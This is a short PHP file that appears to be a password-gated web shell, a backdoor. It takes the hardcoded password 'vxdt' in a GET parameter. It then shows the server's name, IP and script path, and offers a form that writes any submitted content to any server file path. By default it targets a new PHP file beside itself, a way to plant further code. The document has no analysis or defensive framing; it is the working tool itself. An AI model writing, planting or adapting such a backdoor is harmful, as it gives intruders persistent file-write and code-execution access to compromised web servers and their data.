<html>
<head>
<title><?=$_SERVER['SERVER_NAME']?></title>
</head>
<style>
#neirong{width:558px;height:250px;border=#0000 1px solid}
#lujing{width:600px;border=#0000 1px solid}
</style>
<body>
<?php
$PW="vxdt";
if ($_GET[nd]==$PW){
  if ($_POST){
  $fo=fopen($_POST["lujing"],"w");
  if(fwrite($fo,$_POST["neirong"]))
   echo "<font color=red><b>F.l. OK!</b></font>";
  else
   echo "<font color=#33CCFF><b>F.l. NOT!!</b></font>";
}
?>
<?=$_SERVER['SERVER_NAME']?>(<?=@gethostbyname($_SERVER['SERVER_NAME'])?>)<br>
<?php echo $_SERVER["SCRIPT_FILENAME"]?>
<form action="" method="post">
<input type="text" name="lujing" id="lujing" value='<?php echo str_replace('.php','1.php',$_SERVER["SCRIPT_FILENAME"])?>' />
<br><textarea name="neirong" id="neirong"></textarea><input type="submit" id="shc" value="w...t" />
</form>
<?php
 }else{
?><form action="" method="GET"><input type="password" name="nd"><input type="submit" name="" value="sub" /></form>
<?php } ?>